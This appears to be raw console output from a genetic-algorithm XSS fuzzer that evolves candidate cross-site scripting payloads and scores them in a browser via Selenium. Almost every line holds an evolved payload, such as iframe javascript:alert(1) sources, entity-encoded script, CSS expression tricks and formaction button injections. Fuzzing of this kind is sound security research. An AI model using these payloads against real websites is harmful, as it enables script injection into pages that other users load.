[92m1/1 Create individuals using Genetic Algorithm.[0m
[92m[+][0m Evaluating html place : body_tag
[92m[+][0m Create population.
[94m[*][0m Create individual : [195, 49, 110, 173, 11]. 
[94m[*][0m Evaluation individual in body_tag: 61/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 62/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'> ([179, 190, 276, 228, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 63/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 64/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'> ([179, 190, 266, 100, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 65/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 66/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'> ([179, 190, 266, 100, 77])", Score=2.3
[94m[*][0m Evaluation individual in body_tag: 67/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 68/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 69/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 70/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 71/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 72/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 73/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 74/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 75/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 76/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 77/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 78/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 79/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 80/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('> ([179, 190, 168, 111, 77])", Score=2.1
[94m[*][0m Evaluation individual in body_tag: 81/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('> ([179, 190, 168, 111, 77])", Score=2.0
[94m[*][0m Evaluation individual in body_tag: 82/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 83/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))<option>'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))<option>'> ([179, 190, 276, 222, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 84/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"</frameset>\u0061lert``;saivs.js " in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"</frameset>\u0061lert``;saivs.js  ([179, 190, 23, 63, 58])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 85/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 86/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 87/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 88/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'> ([179, 190, 276, 170, 77])", Score=2.2
[94m[*][0m Evaluation individual in body_tag: 89/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 90/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 91/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 92/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 93/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 94/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 95/100 in 186 generation
[94m[*][0m Evaluation individual in body_tag: 96/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.6
[94m[*][0m Evaluation individual in body_tag: 97/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 98/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'> ([179, 190, 276, 228, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 99/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'> ([179, 190, 276, 228, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 100/100 in 186 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'> ([179, 190, 276, 228, 77])", Score=2.5
[92m[+][0m 186 generation result: Min=-1.2000000000000002, Max=2.6, Avg=0.6349999999999998.
[92m[+][0m Evaluate individual : 187/10000 generation.
[94m[*][0m Evaluation individual in body_tag: 1/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('> ([179, 190, 168, 111, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 2/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 3/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.2
[94m[*][0m Evaluation individual in body_tag: 4/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'> ([179, 190, 276, 170, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 5/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 6/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 7/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 8/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('> ([179, 190, 168, 111, 77])", Score=2.3
[94m[*][0m Evaluation individual in body_tag: 9/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 10/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('> ([179, 190, 168, 111, 77])", Score=2.6
[94m[*][0m Evaluation individual in body_tag: 11/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 12/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 13/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 14/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 15/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 16/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 17/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 18/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 19/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"</select></style>onerror=" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"</select></style>onerror= ([179, 190, 31, 236, 216])", Score=2.6
[94m[*][0m Evaluation individual in body_tag: 20/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'> ([179, 190, 266, 100, 77])", Score=2.3
[94m[*][0m Evaluation individual in body_tag: 21/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 22/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 23/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 24/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 25/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'> ([179, 190, 276, 170, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 26/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 27/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 28/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 29/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"'(y=alert)(1)'<canvas/<form><button style="width:100%;height:100%" type=submit formaction="" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"'(y=alert)(1)'<canvas/<form><button style="width:100%;height:100%" type=submit formaction=" ([179, 190, 281, 33, 168])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 30/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 31/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 32/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 33/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'> ([179, 190, 266, 100, 77])", Score=2.1
[94m[*][0m Evaluation individual in body_tag: 34/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 35/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))<option>'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))<option>'> ([179, 190, 276, 222, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 36/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 37/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 38/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 39/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'> ([179, 190, 276, 228, 77])", Score=2.2
[94m[*][0m Evaluation individual in body_tag: 40/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 41/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 42/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 43/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 44/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 45/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 46/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 47/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 48/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"</select></style>onerror=" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"</select></style>onerror= ([179, 190, 31, 236, 216])", Score=2.6
[94m[*][0m Evaluation individual in body_tag: 49/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'> ([179, 190, 266, 100, 77])", Score=2.3
[94m[*][0m Evaluation individual in body_tag: 50/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 51/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 52/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 53/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 54/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'> ([179, 190, 276, 170, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 55/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 56/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 57/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 58/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"'(y=alert)(1)'<canvas/<form><button style="width:100%;height:100%" type=submit formaction="" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"'(y=alert)(1)'<canvas/<form><button style="width:100%;height:100%" type=submit formaction=" ([179, 190, 281, 33, 168])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 59/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 60/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 61/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.6
[94m[*][0m Evaluation individual in body_tag: 62/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 63/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 64/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 65/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 66/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 67/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 68/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 69/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 70/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 71/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 72/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 73/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 74/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 75/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"</select></style>'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"</select></style>'> ([179, 190, 31, 236, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 76/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 77/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"</select></style>onerror=" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"</select></style>onerror= ([179, 190, 31, 236, 216])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 78/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'> ([179, 190, 266, 100, 77])", Score=2.3
[94m[*][0m Evaluation individual in body_tag: 79/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'> ([179, 190, 266, 100, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 80/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 81/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 82/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=1.7999999999999998
[94m[*][0m Evaluation individual in body_tag: 83/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'> ([179, 190, 276, 170, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 84/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 85/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 86/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 87/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 88/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 89/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))from([1],alert)'> ([179, 190, 276, 170, 77])", Score=1.5
[94m[*][0m Evaluation individual in body_tag: 90/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 91/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'> ([179, 190, 276, 228, 77])", Score=2.3
[94m[*][0m Evaluation individual in body_tag: 92/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 93/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 94/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.6
[94m[*][0m Evaluation individual in body_tag: 95/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 96/100 in 187 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"'(y=alert)(1)'<canvas/<form><button style="width:100%;height:100%" type=submit formaction="" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"'(y=alert)(1)'<canvas/<form><button style="width:100%;height:100%" type=submit formaction=" ([179, 190, 281, 33, 168])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 97/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 98/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 99/100 in 187 generation
[94m[*][0m Evaluation individual in body_tag: 100/100 in 187 generation
[92m[+][0m 187 generation result: Min=-1.5, Max=2.6, Avg=0.848.
[92m[+][0m Evaluate individual : 188/10000 generation.
[94m[*][0m Evaluation individual in body_tag: 1/100 in 188 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"&#x61;lert(1)"&#106;avascript:alert(1)"'> ([179, 190, 266, 100, 77])", Score=2.4
[94m[*][0m Evaluation individual in body_tag: 2/100 in 188 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))prototype.'> ([179, 190, 276, 228, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 3/100 in 188 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"xss:expressio\6e(alert(1))\u0061lert``;'> ([179, 190, 276, 63, 77])", Score=2.5
[94m[*][0m Evaluation individual in body_tag: 4/100 in 188 generation
[94m[*][0m Evaluation individual in body_tag: 5/100 in 188 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"'(y=alert)(1)'<canvas/<form><button style="width:100%;height:100%" type=submit formaction="" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"'(y=alert)(1)'<canvas/<form><button style="width:100%;height:100%" type=submit formaction=" ([179, 190, 281, 33, 168])", Score=1.7999999999999998
[94m[*][0m Evaluation individual in body_tag: 6/100 in 188 generation
[94m[*][0m Selenium score : "<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('>" in body_tag.
[94m[*][0m Individual="<iframe src="javascript:alert(1)"<form><button style="width:100%;height:100%" type=submit formaction="alert('> ([179, 190, 168, 111, 77])", Score=1.5
[94m[*][0m Evaluation individual in body_tag: 7/100 in 188 generation
[94m[*][0m Evaluation individual in body_tag: 8/100 in 188 generation
